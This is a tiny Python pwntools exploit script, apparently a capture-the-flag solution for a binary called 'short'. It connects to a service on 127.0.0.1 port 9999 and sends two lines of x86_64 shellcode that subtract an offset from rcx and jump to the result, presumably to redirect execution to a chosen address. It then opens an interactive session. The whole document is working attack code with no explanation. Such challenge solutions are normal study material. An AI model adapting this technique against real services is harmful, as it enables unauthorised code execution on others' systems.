from pwn import *
# io = process('./short')
io = remote('127.0.0.1', 9999)
sc = '''
sub rcx, 0x114eb
jmp rcx
'''
io.send(asm(sc, arch = 'x86_64'))
io.interactive()
